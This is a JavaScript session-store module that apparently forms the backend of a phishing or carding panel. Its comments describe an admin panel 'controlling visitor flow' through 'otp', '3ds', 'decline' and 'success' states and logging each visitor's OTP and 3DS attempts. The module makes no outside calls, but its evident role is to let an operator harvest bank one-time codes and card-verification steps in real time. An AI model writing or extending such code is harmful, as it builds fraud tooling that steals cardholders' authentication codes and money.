/**
 * In-memory session store for controlling visitor flow from admin panel.
 * Shape: { action: 'pending'|'otp'|'3ds'|'decline'|'success', seq: number, data: any }
 */
const sessions = new Map();

/**
 * @param {string} id
 * @param {string} action
 */
export function setAction(id, action) {
  const existing = sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
  existing.action = action;
  existing.seq = (existing.seq ?? 0) + 1;
  existing.updatedAt = Date.now();
  sessions.set(id, existing);
  return existing;
}

/** @param {string} id */
export function getAction(id) {
  return sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
}

/**
 * @param {string} id
 * @param {Record<string, any>} data
 */
export function saveData(id, data) {
  const existing = sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
  existing.data = { ...existing.data, ...data };
  existing.updatedAt = Date.now();
  sessions.set(id, existing);
}

/**
 * Append an entry (OTP attempt / 3DS link attempt) to the session history array.
 * @param {string} id
 * @param {string} key  e.g. 'otps' or 'links'
 * @param {any} entry
 */
export function pushHistory(id, key, entry) {
  const existing = sessions.get(id) ?? { action: 'pending', seq: 0, data: {}, createdAt: Date.now(), updatedAt: Date.now() };
  if (!Array.isArray(existing.data[key])) existing.data[key] = [];
  existing.data[key].push({ value: entry, at: Date.now() });
  existing.updatedAt = Date.now();
  sessions.set(id, existing);
}

export function listSessions() {
  return Array.from(sessions.entries()).map(([id, s]) => ({ id, ...s }));
}

export function deleteSession(id) {
  sessions.delete(id);
}
